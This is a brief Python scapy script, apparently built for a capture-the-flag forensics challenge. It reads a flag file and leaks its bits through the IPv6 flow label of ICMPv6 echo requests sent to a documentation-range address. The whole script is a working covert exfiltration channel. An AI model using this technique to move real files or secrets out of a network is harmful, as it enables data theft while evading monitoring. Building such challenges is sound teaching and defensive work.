#!/usr/bin/env python3

from scapy.all import *
from sys import exit

with open('flag.txt', "r") as f:
    secret_message = f.read().strip()
    print(f"Flag: {secret_message}")


def string_to_bits(message):
    bitstream = ""
    for c in message:
        bits = bin(ord(c))[2:].zfill(8)
        bitstream += bits 
    return bitstream

def send_packet(chunk):
    packet = IPv6(dst="2001:db8:dead::1", fl=int(chunk,2))/ICMPv6EchoRequest(id=0x1337, data=RandString(8))
    send(packet)

bits = string_to_bits(secret_message)

print(f"Bit stream for flag is {bits}")

for i in range(0, len(bits), 20):
    chunk = bits[i: i+20].encode()
    if len(chunk) < 20:
        chunk = chunk.ljust(20, b"0")    # last chunk needs padding out with terminating zeros
    send_packet(chunk)


